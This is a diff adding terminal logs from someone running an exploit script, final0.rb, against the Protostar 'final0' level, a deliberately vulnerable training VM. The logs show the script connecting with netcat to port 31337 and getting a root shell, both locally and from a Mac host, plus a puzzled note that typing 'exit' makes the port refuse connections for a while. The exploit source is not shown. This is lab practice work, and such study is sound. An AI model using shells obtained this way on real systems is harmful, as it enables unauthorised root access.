@@ -1,0 +1,90 @@
+# Execute in the virtual machine:
+
+root@protostar:/tmp# uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+
+root@protostar:/tmp# ./final0.rb 
+> Enter hostname:
+localhost
+> exec: nc -v localhost 31337
+> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time
+> Use Control+C instead
+DNS fwd/rev mismatch: localhost.localdomain != localhost
+localhost.localdomain [127.0.0.1] 31337 (?) open
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+^C
+> END
+
+root@protostar:/tmp# 
+
+
+
+# Execute in the host:
+> uname -a
+Darwin Senris-MacBook-Pro.local 21.4.0 Darwin Kernel Version 21.4.0: Mon Feb 21 20:34:37 PST 2022; root:xnu-8020.101.4~2/RELEASE_X86_64 x86_64
+
+> ./final0.rb
+> Enter hostname:
+192.168.215.129
+> exec: nc -v 192.168.215.129 31337
+> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time
+> Use Control+C instead
+Connection to 192.168.215.129 port 31337 [tcp/*] succeeded!
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+whoami
+root
+^C./final0.rb:53:in `system': Interrupt
+	from ./final0.rb:53:in `<main>'
+
+>
+
+
+
+# This is very weird and i have no idea why
+# If i use `exit` in the shell then for a while the port seems to be unusable
+
+root@protostar:/tmp# ./final0.rb 
+> Enter hostname:
+localhost
+> exec: nc -v localhost 31337
+> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time
+> Use Control+C instead
+DNS fwd/rev mismatch: localhost.localdomain != localhost
+localhost.localdomain [127.0.0.1] 31337 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+^C
+> END
+
+root@protostar:/tmp# ./final0.rb 
+> Enter hostname:
+localhost
+> exec: nc -v localhost 31337
+> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time
+> Use Control+C instead
+DNS fwd/rev mismatch: localhost.localdomain != localhost
+localhost.localdomain [127.0.0.1] 31337 (?) open
+exit
+> END
+
+root@protostar:/tmp# ./final0.rb 
+> Enter hostname:
+localhost
+> exec: nc -v localhost 31337
+> Do not use `exit` in the shell or the port will be inaccessible for a certain period of time
+> Use Control+C instead
+DNS fwd/rev mismatch: localhost.localdomain != localhost
+localhost.localdomain [127.0.0.1] 31337 (?) : Connection refused
+> END
+
+root@protostar:/tmp# 
